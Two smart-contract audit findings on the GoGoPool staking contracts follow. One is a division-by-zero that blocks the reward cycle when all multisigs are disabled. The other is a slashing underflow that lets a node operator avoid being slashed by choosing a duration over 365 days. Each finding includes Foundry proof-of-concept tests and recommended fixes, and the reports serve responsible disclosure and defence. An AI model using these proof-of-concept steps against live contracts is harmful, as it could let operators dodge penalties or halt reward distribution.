# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L229 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L156   # Vulnerability details  ## Impact  Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet is disabled.  ## Proof of Concept  A user needs to call the function startRewardsCycle in RewardsPool.sol  ```solidity /// @notice Public function that will run a GGP rewards cycle if possible function startRewardsCycle() external { ```  which calls:  ```solidity uint256 multisigClaimContractAllotment = getClaimingContractDistribution("ClaimMultisig"); uint256 nopClaimContractAllotment = getClaimingContractDistribution("ClaimNodeOp"); uint256 daoClaimContractAllotment = getClaimingContractDistribution("ClaimProtocolDAO"); if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {  revert IncorrectRewardsDistribution(); }  TokenGGP ggp = TokenGGP(getContractAddress("TokenGGP")); Vault vault = Vault(getContractAddress("Vault"));  if (daoClaimContractAllotment > 0) {  emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);  vault.transferToken("ClaimProtocolDAO", ggp, daoClaimContractAllotment); }  if (multisigClaimContractAllotment > 0) {  emit MultisigRewardsTransfered(multisigClaimContractAllotment);  distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp); }  if (nopClaimContractAllotment > 0) {  emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);  ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress("ClaimNodeOp"));  nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);  vault.transferToken("ClaimNodeOp", ggp, nopClaimContractAllotment); } ```  We need to pay speical attention to the code block below:  ```solidity if (multisigClaimContractAllotment > 0) {  emit MultisigRewardsTransfered(multisigClaimContractAllotment);  distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp); } ```  which calls:  ```solidity /// @notice Distributes GGP to enabled Multisigs /// @param allotment Total GGP for Multisigs /// @param vault Vault contract /// @param ggp TokenGGP contract function distributeMultisigAllotment( uint256 allotment, Vault vault, TokenGGP ggp ) internal { MultisigManager mm = MultisigManager(getContractAddress("MultisigManager"));  uint256 enabledCount; uint256 count = mm.getCount(); address[] memory enabledMultisigs = new address[](count);  // there should never be more than a few multisigs, so a loop should be fine here for (uint256 i = 0; i < count; i++) {  (address addr, bool enabled) = mm.getMultisig(i);  if (enabled) {   enabledMultisigs[enabledCount] = addr;   enabledCount++;  } }  // Dirty hack to cut unused elements off end of return value (from RP) // solhint-disable-next-line no-inline-assembly assembly {  mstore(enabledMultisigs, enabledCount) }  uint256 tokensPerMultisig = allotment / enabledCount; for (uint256 i = 0; i < enabledMultisigs.length; i++) {  vault.withdrawToken(enabledMultisigs[i], ggp, tokensPerMultisig); } } ```  the code distribute the reward to all multisig evenly.  ```solidity uint256 tokensPerMultisig = allotment / enabledCount; ```  However, if the enabledCount is 0, meaning no multisig wallet is enabled, the transactionr revert in division by zero error and revert the startRewardsCycle transaction.  As showns in POC.  In RewardsPool.t.sol,  we change the name from testStartRewardsCycle to testStartRewardsCycle_POC  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L123  we add the code to disable all multisig wallet. before calling rewardsPool.startRewardsCycle  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L138  ```solidity // disable all multisg wallet vm.prank(guardian); ocyticus.disableAllMultisigs(); ```  Then we run the test  ```solidity forge test -vvv --match testStartRewardsCycle_POC ```  the transaction revert in division by zero error, which block the startRewardsCycle  ```solidity         emit MultisigRewardsTransfered(value: 13499352589262561353689)         [537] Storage::getAddress(0xcda836d09bcf3adcec2f52ddddeceac31738a574d5063511c887064e499593df) [staticcall]             MultisigManager: [0xA12E9172eB5A8B9054F897cC231Cd7a2751D6D93]         [1313] MultisigManager::getCount() [staticcall]            [549] Storage::getUint(0x778484468bc504108f077f6bf471293e4138c2d117c6f33607855518cf4bda79) [staticcall]                1             1         [3050] MultisigManager::getMultisig(0) [staticcall]            [537] Storage::getAddress(0xfebe6f39b65f18e050b53df1d0c8d45b8c5cce333324eb048b67b8ee5f26b7a3) [staticcall]                RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f]            [539] Storage::getBool(0x7ef800e7ca09c0c1063313b56290c06f6bc4bae0e9b7af3899bb7d5ade0403c8) [staticcall]                false             RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f], false          "Division or modulo by 0"       "Division or modulo by 0"  Test result: FAILED. 0 passed; 1 failed; finished in 11.64ms  Failing tests: Encountered 1 failing test in test/unit/RewardsPool.t.sol:RewardsPoolTest [FAIL. Reason: Division or modulo by 0] testStartRewardsCycle_POC() (gas: 332890) ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project handle the case when the number of enabled multisig is 0 gracefully to not block the startRewardCycle transaction.
# Lines of code  https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683 https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97   # Vulnerability details  ## Impact When staking is done, a Rialto multisig calls `MinipoolManager.recordStakingEnd` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440)).    If the `avaxTotalRewardAmt` has the value zero, the `MinipoolManager` will slash the node operator's GGP.    The issue is that the amount to slash can be greater than the GGP balance the node operator has staked.    This will cause the call to `MinipoolManager.recordStakingEnd` to revert because an underflow is detected.    This means a node operator can create a minipool that cannot be slashed.    A node operator must provide at least 10% of `avaxAssigned` as collateral by staking GGP.    It is assumed that a node operator earns AVAX at a rate of 10% per year.    So if a Minipool is created with a duration of `> 365 days`, the 10% collateral is not sufficient to pay the expected rewards.    This causes the function call to revert.    Another cause of the revert can be that the GGP price in AVAX changes. Specifically if the GGP price falls, there needs to be slashed more GGP.    Therefore if the GGP price drops enough it can cause the call to slash to revert.    I think it is important to say that with any collateralization ratio this can happen. The price of GGP must just drop enough or one must use a long enough duration.    The exact impact of this also depends on how the Rialto multisig handles failed calls to `MinipoolManager.recordStakingEnd`.    It looks like if this happens, `MinipoolManager.recordStakingError` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L484-L515)) is called.    This allows the node operator to withdraw his GGP stake.    **So in summary a node operator can create a Minipool that cannot be slashed and probably remove his GGP stake when it should have been slashed.**    ## Proof of Concept When calling `MinipoolManager.recordStakingEnd` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L385-L440)) and the `avaxTotalRewardAmt` parameter is zero, the node operator is slashed:   ```solidity // No rewards means validation period failed, must slash node ops GGP. if (avaxTotalRewardAmt == 0) {     slash(minipoolIndex); } ```  The `MinipoolManager.slash` function ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L670-L683)) then calculates `expectedAVAXRewardsAmt` and from this `slashGGPAmt`:   ```solidity uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt"))); uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt); uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt); ```  Downstraem there is then a revert due to underflow because of the following line in `Staking.decreaseGGPStake` ([https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L94-L97)):   ```solidity subUint(keccak256(abi.encodePacked("staker.item", stakerIndex, ".ggpStaked")), amount); ```  You can add the following foundry test to `MinipoolManager.t.sol`:   ```solidity function testRecordStakingEndWithSlashFail() public {     uint256 duration = 366 days;     uint256 depositAmt = 1000 ether;     uint256 avaxAssignmentRequest = 1000 ether;     uint256 validationAmt = depositAmt + avaxAssignmentRequest;     uint128 ggpStakeAmt = 100 ether;      vm.startPrank(nodeOp);     ggp.approve(address(staking), MAX_AMT);     staking.stakeGGP(ggpStakeAmt);     MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);     vm.stopPrank();      address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);     vm.prank(liqStaker1);     ggAVAX.depositAVAX{value: MAX_AMT}();      vm.prank(address(rialto));     minipoolMgr.claimAndInitiateStaking(mp1.nodeID);      bytes32 txID = keccak256("txid");     vm.prank(address(rialto));     minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);      vm.startPrank(address(rialto));      skip(duration);      minipoolMgr.recordStakingEnd{value: validationAmt}(mp1.nodeID, block.timestamp, 0 ether); } ```  See that it runs successfully with `duration = 365 days` and fails with `duration = 366 days`.    The similar issue occurs when the GGP price drops. I chose to implement the test with `duration` as the cause for the underflow because your tests use a fixed AVAX/GGP price.    ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps You should check if the amount to be slashed is greater than the node operator's GGP balance. If this is the case, the amount to be slashed should be set to the node operator's GGP balance.    I believe this check can be implemented within the `MinipoolManager.slash` function without breaking any of the existing accounting logic.    ```solidity function slash(int256 index) private {     address nodeID = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".nodeID")));     address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));     uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));     uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));     uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);     uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);     setUint(keccak256(abi.encodePacked("minipool.item", index, ".ggpSlashAmt")), slashGGPAmt);      emit GGPSlashed(nodeID, slashGGPAmt);      Staking staking = Staking(getContractAddress("Staking"));      if (slashGGPAmt > staking.getGGPStake(owner)) {         slashGGPAmt = staking.getGGPStake(owner);     }          staking.slashGGP(owner, slashGGPAmt); } ```  
